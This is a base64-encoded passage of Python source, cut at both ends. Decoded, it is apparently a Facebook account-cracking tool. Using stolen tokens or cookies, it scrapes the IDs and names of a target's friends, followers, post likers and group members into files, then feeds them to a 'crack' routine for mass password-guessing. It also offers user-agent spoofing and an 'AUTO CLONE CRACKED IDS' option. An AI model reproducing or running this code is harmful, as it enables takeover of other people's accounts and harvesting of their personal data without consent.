0KICAgIHByaW50KCclcyBbJXPigKIlc10gJXNGUk9NICAgJXM6ICVzJXMnJShILFAsSCxCLEssSCxsb2MpKQ0KICAgIHByaW50KCclcyBbJXPigKIlc10gJXNTVEFUVVMgJXM6ICVzUFJFTUlVTSA6KSclKEgsUCxILEIsSyxIKSkNCiAgICBwcmludCgnJykNCiAgICBwcmludCgnJXMgWyVzPl8lc10gJXNUT0tFTiVzLyVzQ09PS0lFUyAlczogJXNZRVMlcy8lcyclKEgsUCxILEIsWixCLEssSCxQLHN0YXR1c19jb29raWVzKSkNCiAgICBwcmludCgnJXMgJyUoTykpDQogICAgcHNiKCclcyBbJXMwMSVzXSAlc0NMT05FIEZST00gRlJJRU5EL1BVQkxJQyBJRCAnJShILFAsSCxIKSkNCiAgICBwc2IoJyVzIFslczAyJXNdICVzQ0xPTkUgRlJPTSBGT0xMT1dFUiBJRCBWMSclKEgsUCxILEIxKSkNCiAgICBwc2IoJyVzIFslczAzJXNdICVzQ0xPTkUgRlJPTSBGT0xMT1dFUiBJRCBWMiclKEgsUCxILE0xKSkNCiAgICBwc2IoJyVzIFslczA0JXNdICVzQ0xPTkUgRlJPTSBTRUFSQ0ggTkFNRSBJRCAnJShILFAsSCxPMSkpDQogICAgcHNiKCclcyBbJXMwNSVzXSAlc0NMT05FIEZST00gTUVTU0FHRSBMSVNUIElEICclKEgsUCxILEsxKSkNCiAgICBwc2IoJyVzIFslczA2JXNdICVzQ0xPTkUgRlJPTSBQT1NUIFJFQUNUUyAnJShILFAsSCxIMSkpDQogICAgcHNiKCclcyBbJXMwNyVzXSAlc0NMT05FIEZST00gUE9TVCBDT01NRU5UUyAnJShILFAsSCxCMSkpDQogICAgcHNiKCclcyBbJXMwOCVzXSAlc0NMT05FIEZST00gR1JPVVAgTUVNQkVSUyAnJShILFAsSCxNMSkpDQogICAgcHNiKCclcyBbJXMwOSVzXSAlc0NMT05FIElEIEZST00gRU1BSUwnJShILFAsSCxPKSkNCiAgICBwc2IoJyVzIFslczEwJXNdICVzQ0xPTkUgVVNFUk5BTUUnJShILFAsSCxLKSkNCiAgICBwc2IoJyVzIFslczExJXNdICVzQ0xPTkUgRlJPTSBIQVNIVEFHJyUoSCxQLEgsQjEpKQ0KICAgIHBzYignJXMgWyVzMTIlc10gJXNDTE9ORSBJRCBGUk9NIEhPTUUgUEFHRSclKEgsUCxILFAxKSkNCiAgICBwc2IoJyVzIFslczEzJXNdICVzQ0xPTkUgSUQgRlJPTSBGUklFTkQgUkVRVUVTVFMgJyUoSCxQLEgsSzEpKQ0KICAgIHBzYignJXMgWyVzMTQlc10gJXNDTE9ORSBGUk9NIFNFTlQgUkVRVUVTVFMgJyUoSCxQLEgsSDEpKQ0KICAgIHBzYignJXMgWyVzMTUlc10gJXNDT0xMRUNUIFVJRCBGUk9NIFBVQkxJQyBJRCclKEgsUCxILE8pKQ0KICAgIHBzYignJXMgWyVzMTYlc10gJXNBVVRPIENMT05FIENSQUNLRUQgSURTJyUoSCxQLEgsSykpDQogICAgcHNiKCclcyBbJXMxNyVzXSAlc1ZJRVcgQ0xPTkUgUkVTVUxUUyAnJShILFAsSCxQKSkNCiAgICBwc2IoJyVzIFslczE4JXNdICVzVVNFUiBBR0VOVCBTRVRUSU5HUyAnJShILFAsSCxNKSkNCiAgICBwc2IoJyVzIFslczE5JXNdICVzIEZJTEUnJShILFAsSCxIKSkNCiAgICBwc2IoJyVzIFslczAwJXNdICVzTE9HIE9VVCclKEgsTSxILE0pKQ0KICAgIHByaW50KCcnKQ0KICAgIHBtID0gX2NpY2lfYXppbXZhdV8oJyVzIFslcz5fJXNdICVzQ0hPT1NFIDogJXMnJShILFAsSCxLLEgpKQ0KICAgIHByaW50KCclcyAnJShPKSkNCiAgICBpZiBwbSBpbiBbJyddOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShQLE0sUCxNKSk7bWVudSgpDQogICAgZWxpZiBwbSBpbiBbJzEnLCcwMScsJzAwMScsJ2EnXTpwdWJsaWsodG9rZW4pDQogICAgZWxpZiBwbSBpbiBbJzInLCcwMicsJzAwMicsJ2InXTpwZW5naWt1dCh0b2tlbikNCiAgICBlbGlmIHBtIGluIFsnMycsJzAzJywnMDAzJywnYyddOmNla19kZXYoKTtmb2xsb3dlcnMoX3NhbHNhYmlsYV8pDQogICAgZWxpZiBwbSBpbiBbJzQnLCcwNCcsJzAwNCcsJ2QnXTpjZWtfZGV2KCk7ZHVtcF9uYW1lKF9zYWxzYWJpbGFfKQ0KICAgIGVsaWYgcG0gaW4gWyc1JywnMDUnLCcwMDUnLCdlJ106Y2VrX2RldigpO2R1bXBfcGVzYW4oX3NhbHNhYmlsYV8sbixpKQ0KICAgIGVsaWYgcG0gaW4gWyc2JywnMDYnLCcwMDYnLCdmJ106Y2VrX2RldigpO21haW5fbGlrZXJzKF9zYWxzYWJpbGFfKQ0KICAgIGVsaWYgcG0gaW4gWyc3JywnMDcnLCcwMDcnLCdnJ106Y2VrX2RldigpO21haW5fa29tZW4oX3NhbHNhYmlsYV8pDQogICAgZWxpZiBwbSBpbiBbJzgnLCcwOCcsJzAwOCcsJ2gnXTpjZWtfZGV2KCk7ZHVtcF9ncnVwKF9zYWxzYWJpbGFfLF9hemltdmF1XykNCiAgICBlbGlmIHBtIGluIFsnOScsJzA5JywnMDA5JywnaSddOmR1bXBfZW1haWwoKQ0KICAgIGVsaWYgcG0gaW4gWycxMCcsJzAxMCcsJzAwMTAnLCdqJ106ZHVtcF91c2VybmFtZSgpDQogICAgZWxpZiBwbSBpbiBbJzExJywnMDExJywnMDAxMScsJ2snXTpjZWtfZGV2KCk7aGFzaHRhZyhfc2Fsc2FiaWxhXykNCiAgICBlbGlmIHBtIGluIFsnMTInLCcwMTInLCcwMDEyJywnbCddOmNla19kZXYoKTtiZXJhbmRhKF9zYWxzYWJpbGFfKQ0KICAgIGVsaWYgcG0gaW4gWycxMycsJzAxMycsJzAwMTMnLCdtJ106Y2VrX2RldigpO3Blcm1pbnRhYW5fcGVydGVtYW5hbl9tYXN1ayhfc2Fsc2FiaWxhXykNCiAgICBlbGlmIHBtIGluIFsnMTQnLCcwMTQnLCcwMDE0JywnbiddOmNla19kZXYoKTtwZXJtaW50YWFuX3BlcnRlbWFuYW5fa2VsdWFyKF9zYWxzYWJpbGFfKQ0KICAgIGVsaWYgcG0gaW4gWycxNScsJzAxNScsJzAwMTUnLCdvJ106dGVtYW5fdGFyZ2V0KCkNCiAgICBlbGlmIHBtIGluIFsnMTYnLCcwMTYnLCcwMDE2JywncCddOmNla19yZXN1bHQoKQ0KICAgIGVsaWYgcG0gaW4gWycxNycsJzAxNycsJzAwMTcnLCdxJ106cmVzdWx0KCkNCiAgICBlbGlmIHBtIGluIFsnMTgnLCcwMTgnLCcwMDE4JywnciddOnVnZW4oKQ0KICAgIGVsaWYgcG0gaW4gWycxOScsJzAxOScsJzAwMTknLCdzJ106ZmlsZSgpDQogICAgZWxpZiBwbSBpbiBbJzAnLCcwMCcsJzAwMCcsJ3onXTpqYWxhbignJXMgWyVzISVzXSAlc1NFRSBZT1UgJXMlcyVzJyUoSCxQLEgsSyxPLG4sUCkpO2JlcnNpaCgpO21lbnVfbG9nKCkNCiAgICBlbHNlOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShNLFAsTSxQKSk7bWVudSgpDQoNCg0KZGVmIGRlZmF1bHR1YSgpOg0KICAgIHVhID0gdWFfeGlhb21pDQogICAgdHJ5OnVnZW50ID0gX2F6aW12YXVfZGFwdW50YV8oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YSk7dWdlbnQuY2xvc2UoKQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6bWVudV9sb2coKQ0KDQoNCmRlZiB1Z2VuKCk6DQogICAgdmFyX3VnZW4oKQ0KICAgIHBtdSA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNDSE9PU0UgOiAnJShILFAsSCxLKSkNCiAgICBwcmludCgnJXMgJyUoTykpDQogICAgaWYgcG11IGluWyIiXTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sUCkpO21lbnUoKQ0KICAgIGVsaWYgcG11IGluIFsnMScsJzAxJywnMDAxJywnYSddOm9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zZWFyY2g/cT1NeStVc2VyK0FnZW50Jm9xPU15K1VzZXIrQWdlbnQmYXFzPWNocm9tZS4uNjlpNTdqMGwzajBpMjJpMzBsNi40Njc0ajBqMSZzb3VyY2VpZD1jaHJvbWUmaWU9VVRGLTgnKTtfY2ljaV9hemltdmF1XygnJXMgWyAlc0JBQ0sgJXNdJXMnJShNLFAsTSxLKSk7bWVudSgpDQogICAgZWxpZiBwbXUgaW4gWycyJywnMDInLCcwMDInLCdiJ106DQogICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIHVnZW50LnR4dCIpO3VhID0gX2NpY2lfYXppbXZhdV8oIiVzIFslc+KAoiVzXSAlc0VOVEVSIFVTRVIgQUdFTlQgOiBcblxuIiUoSCxQLEgsSykpDQogICAgICAgIHRyeTp1Z2VudCA9IF9hemltdmF1X2RhcHVudGFfKCd1Z2VudC50eHQnLCd3Jyk7dWdlbnQud3JpdGUodWEpO3VnZW50LmNsb3NlKCk7amFsYW4oIlxuJXMgWyAlc1NVQ0NFU1NGVUxMWSBDSEFOR0VEIFVTRVIgQUdFTlQgJXNdIiUoSCxQLEgpKTtwcmludCgnJXMgJyUoTykpO19jaWNpX2F6aW12YXVfKCclcyBbICVzQkFDSyAlc10lcyclKEgsUCxILEspKTttZW51KCkNCiAgICAgICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTpqYWxhbigiXG4lcyBbICVzRkFJTEVEIFRPIENIQU5HRSBVU0VSIEFHRU5UICVzXSIlKFosTSxaKSk7cHJpbnQoJyVzICclKE0pKTtfY2ljaV9hemltdmF1XygnJXMgWyAlc0JBQ0sgJXNdJXMnJShNLFAsTSxQKSk7bWVudSgpDQogICAgZWxpZiBwbXUgaW4gWyczJywnMDMnLCcwMDMnLCdjJ106dWdlbl9ocCgpDQogICAgZWxpZiBwbXUgaW4gWyc0JywnMDQnLCcwMDQnLCdkJ106b3Muc3lzdGVtKCJybSAtcmYgdWdlbnQudHh0Iik7amFsYW4oIiVzIFsgJXNVU0VSIEFHRU5UIFNVQ0NFU1NGVUxMWSBERUxFVEVEICVzXSIlKEgsUCxIKSk7cHJpbnQoJyVzICclKE8pKTtfY2ljaV9hemltdmF1XygnJXMgWyAlc0JBQ0sgJXNdJXMnJShILFAsSCxLKSk7bWVudSgpDQogICAgZWxpZiBwbXUgaW4gWyc1JywnMDUnLCcwMDUnLCdlJ106DQogICAgICAgIHRyeTp1bmdzZXIgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywgJ3InKS5yZWFkKCkNCiAgICAgICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTp1bmdzZXIgPSAnTk9UIEZPVU5EJw0KICAgICAgICBwcmludCgiJXMgWyVz4oCiJXNdICVzWU9VUiBVU0VSIEFHRU5UICA6IFxuXG4lcyVzIiUoSCxQLEgsUCxPLHVuZ3NlcikpO2phbGFuKCJcbiVzIFsgJXNUSElTIElTIFlPVVIgQ1VSUkVOVCBVU0VSIEFHRU5UICVzXSIlKEgsSyxIKSk7cHJpbnQoJyVzICclKE8pKTtfY2ljaV9hemltdmF1XygnJXMgWyAlc0JBQ0sgJXNdJXMnJShILFAsSCxLKSk7bWVudSgpDQogICAgZWxpZiBwbXUgaW4gWycwJywnMDAnLCcwMDAnLCdmJ106bWVudSgpDQogICAgZWxzZTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sUCkpDQpkZWYgdWdlbl9ocCgpOg0KICAgIG9zLnN5c3RlbSgicm0gLXJmIHVnZW50LnR4dCIpDQogICAgcHJpbnQoJyVzIFslczElc10gJUlOVEVMTUFDJyUoSCxQLEgsSykpDQogICAgcHJpbnQoJyVzIFslczIlc10gJXNOT0tJQSclKEgsUCxILEgpKQ0KICAgIHByaW50KCclcyBbJXMzJXNdICVzQVNVUyclKEgsUCxILE0pKQ0KICAgIHByaW50KCclcyBbJXM0JXNdICVzSFVBV0VJJyUoSCxQLEgsQikpDQogICAgcHJpbnQoJyVzIFslczUlc10gJXNWSVZPJyUoSCxQLEgsTykpDQogICAgcHJpbnQoJyVzIFslczYlc10gJXNPUFBPJyUoSCxQLEgsSykpDQogICAgcHJpbnQoJyVzIFslczclc10gJXNTQU1TVU5HJyUoSCxQLEgsQikpDQogICAgcHJpbnQoJyVzIFslczglc10gJXNXSU5ET1dTJyUoSCxQLEgsTSkpDQogICAgcHJpbnQoJyVzIFslczklc10gJXNYSUFPTUknJShILFAsSCxNKSkNCiAgICBwcmludCgnJykNCiAgICBwYyA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNDSE9PU0UgOiAnJShILFAsSCxLKSkNCiAgICBwcmludCgnJXMgJyUoTykpDQogICAgaWYgcGMgaW5bJyddOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShNLFAsTSxNKSk7bWVudSgpDQogICAgZWxpZiBwYyBpbiBbJzEnLCcwMSddOnVnZW50ID0gX2F6aW12YXVfZGFwdW50YV8oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV94aWFvbWkpO3VnZW50LmNsb3NlKCkNCiAgICBlbGlmIHBjIGluIFsnMicsJzAyJ106dWdlbnQgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywndycpO3VnZW50LndyaXRlKHVhX25va2lhKTt1Z2VudC5jbG9zZSgpDQogICAgZWxpZiBwYyBpbiBbJzMnLCcwMyddOnVnZW50ID0gX2F6aW12YXVfZGFwdW50YV8oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV9hc3VzKTt1Z2VudC5jbG9zZSgpDQogICAgZWxpZiBwYyBpbiBbJzQnLCcwNCddOnVnZW50ID0gX2F6aW12YXVfZGFwdW50YV8oJ3VnZW50LnR4dCcsJ3cnKTt1Z2VudC53cml0ZSh1YV9odWF3ZWkpO3VnZW50LmNsb3NlKCkNCiAgICBlbGlmIHBjIGluIFsnNScsJzA1J106dWdlbnQgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywndycpO3VnZW50LndyaXRlKHVhX3Zpdm8pO3VnZW50LmNsb3NlKCkNCiAgICBlbGlmIHBjIGluIFsnNicsJzA2J106dWdlbnQgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywndycpO3VnZW50LndyaXRlKHVhX29wcG8pO3VnZW50LmNsb3NlKCkNCiAgICBlbGlmIHBjIGluIFsnNycsJzA3J106dWdlbnQgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywndycpO3VnZW50LndyaXRlKHVhX3NhbXN1bmcpO3VnZW50LmNsb3NlKCkNCiAgICBlbGlmIHBjIGluIFsnOCcsJzA4J106dWdlbnQgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywndycpO3VnZW50LndyaXRlKHVhX3dpbmRvd3MpO3VnZW50LmNsb3NlKCkNCiAgICBlbGlmIHBjIGluIFsnOScsJzA5J106dWdlbnQgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywndycpO3VnZW50LndyaXRlKHVhX2ludGVsbWFjKTt1Z2VudC5jbG9zZSgpDQogICAgZWxzZTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sUCkpO21lbnUoKQ0KICAgIGphbGFuKCIlcyBbICVzU1VDQ0VTU0ZVTExZIENIQU5HRUQgVVNFUiBBR0VOVCAlc10iJShILFAsSCkpO3ByaW50KCclcyAnJShPKSk7X2NpY2lfYXppbXZhdV8oJyVzIFsgJXNCQUNLICVzXSVzJyUoTSxQLE0sUCkpO21lbnUoKQ0KDQoNCmRlZiBwdWJsaWsodG9rZW4pOg0KICAgIGppZCA9ICc1MDAwJw0KICAgIHRyeToNCiAgICAgICAgcHJpbnQoJyVzIFslc+KAoiVzXSAlc1dSSVRFIFwnbWVcJyBUTyBSRVRSSUVWRSBGUklFTkQgSUQnJShILFAsSCxLKSk7aXQgPSBfY2ljaV9hemltdmF1XygiJXMgWyVz4oCiJXNdICVzVEFSR0VUIElEIDogIiUoSCxQLEgsSykpO2Nla190YXJnZXRfY3JhY2tfKGl0KQ0KICAgICAgICB0cnk6cGIgPSBfcmVxX2dldF8oImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpdCArICI/ZmllbGRzPW5hbWUsaWQsZmlyc3RfbmFtZSxtaWRkbGVfbmFtZSxsYXN0X25hbWUsbmFtZV9mb3JtYXQscGljdHVyZSxzaG9ydF9uYW1lJmFjY2Vzc190b2tlbj0iICsgdG9rZW4pO29iID0gX2pzX2xvXyhwYi50ZXh0KTtwcmludCAoJyVzIFslc+KAoiVzXSAlc05BTUUgOiAlcyclKEgsUCxILEssb2JbJ25hbWUnXSkpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6cHJpbnQoJyVzICclKE8pKTtqYWxhbignJXMgWyVzISVzXSAlc0lEIE5PVCBGT1VORCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgciA9IF9yZXFfZ2V0XygiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9saW1pdD0lcyZmaWVsZHM9bmFtZSxpZCxmaXJzdF9uYW1lLG1pZGRsZV9uYW1lLGxhc3RfbmFtZSxuYW1lX2Zvcm1hdCxwaWN0dXJlLHNob3J0X25hbWUmYWNjZXNzX3Rva2VuPSVzIiUoaXQsamlkLHRva2VuKSk7aWQgPSBbXTt6ID0gX2pzX2xvXyhyLnRleHQpO3hjID0gKG9iWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKTt4YiA9IF9hemltdmF1X2RhcHVudGFfKHhjLCJ3IikNCiAgICAgICAgZm9yIGEgaW4gelsiZGF0YSJdOg0KICAgICAgICAgICAgdHJ5OmlkLmFwcGVuZChhWyJpZCJdKyLigKIiK2FbIm5hbWUiXSk7eGIud3JpdGUoYVsiaWQiXSsi4oCiIithWyJuYW1lIl0rIlxuIikNCiAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICB4Yi5jbG9zZSgpO3ByaW50KCclcyBbJXPigKIlc10gJXNUT1RBTCBJRCA6ICVzJyUoSCxQLEgsSyxsZW4oaWQpKSk7cmV0dXJuIGNyYWNrKHhjKQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6X2NpY2lfY2ljaV8oJyVzIFslcyElc10gJXNJTlZBTElEIFRPS0VOL0NPT0tJRVMgT1IgSUQgTk9UIEZPVU5EJyUoTSxQLE0sUCkpDQoNCg0KZGVmIHBlbmdpa3V0KHRva2VuKToNCiAgICB0cnk6DQogICAgICAgIGppZCA9ICcxMDAwZzAnDQogICAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pDQogICAgICAgIHkgPSBqc29uLmxvYWRzKHgudGV4dCkNCiAgICAgICAgbiA9IHlbJ25hbWUnXS51cHBlcigpDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgeG94KCclcyBbJXMhJXNdICVzSU5WQUxJRCBUT0tFTi9DT09LSUVTJyUoTSxQLE0sUCkpDQogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHRva2VuLnR4dCcpDQogICAgICAgIG1lbnVfbG9nKCkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgIHhveCgnJXMgWyVzISVzXSAlc0NPTk5FQ1RJT04gUFJPQkxFTSclKE0sUCxNLFApKQ0KICAgICAgICBleGl0KCkNCiAgICB0cnk6DQogICAgICAgIHByaW50KCclcyBbJXPigKIlc10gJXNXUklURSBcJ21lXCcgRk9SIFRBS0lORyBGUklFTkQgSUQnJShILFAsSCxLKSkNCiAgICAgICAgaXQgPSBpbnB1dCgiJXMgWyVz4oCiJXNdICVzVEFSR0VUIElEIDogJXMiJShILFAsSCxLLEgpKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBwYiA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGl0ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQ0KICAgICAgICAgICAgb2IgPSBqc29uLmxvYWRzKHBiLnRleHQpDQogICAgICAgICAgICBwcmludCAoJyVzIFslc+KAoiVzXSAlc05BTUUgOiAlcyVzJyUoSCxQLEgsTyxILG9iWyduYW1lJ10udXBwZXIoKSkpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgICAgICBwcmludA0KICAgICAgICAgICAgeG94KCclcyBbJXMhJXNdICVzSUQgTk9UIEZPVU5EJyUoTSxQLE0sUCkpDQogICAgICAgICAgICBtZW51KCkNCiAgICAgICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzIiUoaXQsamlkLHRva2VuKSkNCiAgICAgICAgaWQgPSBbXQ0KICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpDQogICAgICAgIHhjID0gKG9iWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICB4YiA9IG9wZW4oeGMsInciKQ0KICAgICAgICBmb3IgYSBpbiB6WyJkYXRhIl06DQogICAgICAgICAgICBpZC5hcHBlbmQoYVsiaWQiXSsi4oCiIithWyJuYW1lIl0pDQogICAgICAgICAgICB4Yi53cml0ZShhWyJpZCJdKyLigKIiK2FbIm5hbWUiXSsiXG4iKQ0KICAgICAgICB4Yi5jbG9zZSgpDQogICAgICAgIHByaW50KCclcyBbJXPigKIlc10gJXNUT1RBTCBJRCA6ICVzJXMnJShILFAsSCxPLEgsbGVuKGlkKSkpDQogICAgICAgIHJldHVybiBjcmFjayh4YykNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGV4aXQoJyVzIFslcyElc10gJXNFUlJPUiA6ICVzJyUoTSxQLE0sUCxlKSkNCg0KDQoNCmRlZiBmb2xsb3dlcnMoY29va2llcyk6DQogICAgX3F1ZXJ5XyA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNFTlRFUiBUQVJHRVQgSUQgOiAnJShILFAsSCxLKSk7cHJpbnQoIiVzIFslc+KAoiVzXSAlc1BSRVNTIENUUkwrQyBUTyBTVE9QIERVTVAiJShILFAsSCxLKSk7X2ZpbGVfID0gX3F1ZXJ5XysnLmpzb24nO191cmxfZGV2XyA9ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc3Vic2NyaWJlL2xpc3RzLz9pZD0nICsgX3F1ZXJ5XztfZmlsZV8gPSAoX3F1ZXJ5XysnLmpzb24nKS5yZXBsYWNlKCcgJywnXycpDQogICAgdHJ5Om9zLnJlbW92ZShfZmlsZV8pDQogICAgZXhjZXB0OnBhc3MNCiAgICBleGVjX2ZvbGxvd2VycyhfdXJsX2Rldl8sY29va2llcyxfZmlsZV8pO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCIlKEgsUCxILEssbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpLnNwbGl0bGluZXMoKSkpKTtyZXR1cm4gY3JhY2soX2ZpbGVfKQ0KZGVmIGV4ZWNfZm9sbG93ZXJzKHVybCxjb29raWVzLF9maWxlXyk6DQogICAgb3BlbihfZmlsZV8sJ2EnKTtfcmVxX3Nlc18gPSByZXF1ZXN0cy5TZXNzaW9uKCk7X3JlcV9nZXRfID0gX3JlcV9zZXNfLmdldCh1cmwsY29va2llcz1jb29raWVzKTtfc29wX2Rldl8gPSBwYXIoX3JlcV9nZXRfLnRleHQsJ2h0bWwucGFyc2VyJyk7X2J1a2FfZmlsZV8gPSBvcGVuKF9maWxlXykucmVhZCgpO3ByaW50KCJcciVzIFslc+KAoiVzXSAlc1RBS0lORyAlcyVzIElEIiUoSCxQLEgsSyxILGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSwgZW5kPScgJyk7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgdHJ5Og0KICAgICAgICBmb3IgX2NpY2lfIGluIF9zb3BfZGV2Xy5maW5kX2FsbCgnYScsaHJlZj1UcnVlKToNCiAgICAgICAgICAgIGlmICJwcm9maWxlLnBocCIgaW4gX2NpY2lfLmdldCgnaHJlZicpOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgX25hbWVfZGV2XyA9IF9jaWNpXy50ZXh0O19pZF9kZXZfID0gIiIuam9pbihiczQucmUuZmluZGFsbCgicHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLF9jaWNpXy5nZXQoImhyZWYiKSkpDQogICAgICAgICAgICAgICAgICAgIGlmIF9uYW1lX2Rldl8gaW4gX2J1a2FfZmlsZV86cGFzcw0KICAgICAgICAgICAgICAgICAgICBlbGlmICcvJyBpbiBfaWRfZGV2XzpwYXNzDQogICAgICAgICAgICAgICAgICAgIGVsc2U6b3BlbihfZmlsZV8sJ2ErJykud3JpdGUoJyVz4oCiJXNcbiclKF9pZF9kZXZfLF9uYW1lX2Rldl8pKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICBlbHNlOnBhc3MNCiAgICAgICAgZm9yIF9jaWNpXyBpbiBfc29wX2Rldl8uZmluZF9hbGwoJ2EnLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICBpZiAnU2VlIG1vcmUnIGluIF9jaWNpXy50ZXh0OnVybF9kZXYgPSAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLycgKyBfY2ljaV8uZ2V0KCdocmVmJyk7ZXhlY19mb2xsb3dlcnModXJsX2Rldixjb29raWVzLF9maWxlXykNCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6cHJpbnQoIlxuJXMgWyVz4oCiJXNdICVzU1VDQ0VTU0ZVTCBEVU1QICVzIElEIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfKS5yZWFkKCkuc3BsaXRsaW5lcygpKSkpO3JldHVybiBjcmFjayhfZmlsZV8pDQoNCg0KDQpkZWYgbWFpbl9saWtlcnMoX2F6aW12YXVfKToNCiAgICBfcXVlcnlfID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0VOVEVSIFBPU1QgSUQgOiAnJShILFAsSCxLKSk7cHJpbnQoIiVzIFslc+KAoiVzXSAlc1BSRVNTIENUUkwrQyBUTyBTVE9QIERVTVAiJShILFAsSCxLKSk7X2ZpbGVfID0gX3F1ZXJ5XysnLmpzb24nDQogICAgdHJ5Om9zLnJlbW92ZShfcXVlcnlfKycuanNvbicpDQogICAgZXhjZXB0OnBhc3MNCiAgICBfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8sJ3cnKTtfdXJsXyA9ICgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3VmaS9yZWFjdGlvbi9wcm9maWxlL2Jyb3dzZXIvP2Z0X2VudF9pZGVudGlmaWVyPScrX3F1ZXJ5Xyk7c2NyYXBlX2xpa2VycyhfYXppbXZhdV8sX3VybF8sX2ZpbGVfKQ0KICAgIGlmIGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpID09IDA6cHJpbnQoJ1xuJXMgWyVzISVzXSAlc1BPU1QgTk9UIEZPVU5EJyUoTSxQLE0sUCkpO19jaWNpX2NpY2lfKCkNCiAgICBwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSk7cmV0dXJuIGNyYWNrKF9maWxlXykNCmRlZiBzY3JhcGVfbGlrZXJzKF9hemltdmF1XyxfdXJsXyxfZmlsZV8pOg0KICAgIF9zZXNfID0gX3JlcV9zZXNfO191cmxfbG9hZF8gPSBfc2VzXy5nZXQoX3VybF8sY29va2llcz1fYXppbXZhdV8saGVhZGVycz1oZWFkZXJfZ3J1cCkudGV4dC5lbmNvZGUoInV0Zi04Iik7X3Nlc19wYXJfID0gcGFyKF91cmxfbG9hZF8sJ2h0bWwucGFyc2VyJyk7cHJpbnQoIlxyJXMgWyVz4oCiJXNdICVzVEFLSU5HICVzJXMgSUQiJShILFAsSCxLLEgsbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZ